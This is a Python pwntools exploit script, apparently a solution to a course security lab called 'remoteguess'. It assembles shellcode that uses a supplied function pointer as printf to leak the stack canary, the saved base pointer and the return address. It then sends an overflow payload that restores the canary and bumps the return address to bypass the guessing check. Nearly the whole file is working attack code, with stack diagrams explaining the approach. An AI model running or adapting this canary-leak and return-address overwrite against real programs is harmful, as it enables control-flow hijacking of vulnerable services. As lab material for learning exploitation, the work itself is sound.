#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'


payload = None
from_exe = False
if len(sys.argv) >= 2: #from file
    from_exe = True
    exe = sys.argv[1]
    if os.path.exists(exe): 
        print(f'open file {exe}')
        with open(exe, 'rb') as f:   
            payload = f.read()

else:    # Assemble the code
    """
    Stack Status
    Before function call
                               low
            +-------------------+
    rbp ->  |   (pushed) rbp    |
            +-------------------+ main start
            |   main's canary   |
            +-------------------+
            |                   |
            |       ......      |
            |                   |
            +-------------------+
    rsp ->  |   main's return   |
            +-------------------+
            |                   |
                               high

    After normal function call
                               low
            +-------------------+
            |   (pushed) rbp    |  <------------+
            +-------------------+ main start    |
            |   main's canary   |               |
            +-------------------+               |
            |                   |               |
            |       ......      |               |
            |                   |               |
            +-------------------+               |
            |   main's return   |               |
            +-------------------+ func start    |
    rbp ->  |   (pushed) rbp  --+---------------+
            +-------------------+
            |   func's canary   |
            +-------------------+
            |                   |
    rsp ->  |       ......      |
                               high

    We need main's return, (pushed) rbp in func and func's canary after function call
    1. main's return: the value of original rsp point to -> [rsp]
    2. (pushed) rbp: it point to the address of original (pushed) rbp, so we can simply use original rbp value -> rbp
    3. func's canary: same as main's canary -> [rbp-8]

    """
    asm_code = r"""
        mov r8, rdi           # save fptr
        lea rdi, [rip+.FPTR]  # fptr("%018p%018p%018p",
        mov rsi, [rbp-8]      #       *(rbp-8),
        mov rdx, rbp          #       *(rbp),
        mov rcx, [rsp]        #       *(rbp+8));
        jmp r8                # call fptr
    .FPTR:
        .string "%018p\n%018p\n%018p\n"
    """
    payload = asm(asm_code, arch= context.arch, os=context.os)
    print(f'load assembly:\n{disasm(payload)}')

r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
#r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    send_byte_count = len(payload)
    offset = 0
    if from_exe:
        ef = ELF(exe)  
        offset = ef.symbols['solver']

    print("** {} bytes to submit, solver found at {:x}".format(len(payload), offset))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(offset).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

#
receive_count_return_line = r.recvline(timeout=5)

memory = []
for i in range(3):
    memory_line = r.recvline(keepends= False, timeout=5)
    content = int(memory_line.decode(), base=16)
    print(f'0x{content:016x}')
    memory.append(content)


"  solve return a2ff"
"-)guess return a3aa"
"-------------------"
"               00ab"
memory[2] += 0xab
print(f'{memory[0]:016x}'.encode(), f'{memory[1]:016x}'.encode(),f'{memory[2]:016x}'.encode())

r.sendafter(b'Show me your answer? ',
            b'0               ' # 16 leading zero to fill buffer
            b'        ' # fill local variable
            + p64(memory[0])# canary
            + p64(memory[1])# rbp
            + p64(memory[2])# return addr.
            +b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0")   # write until overwrite "magic" variable

r.interactive()
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
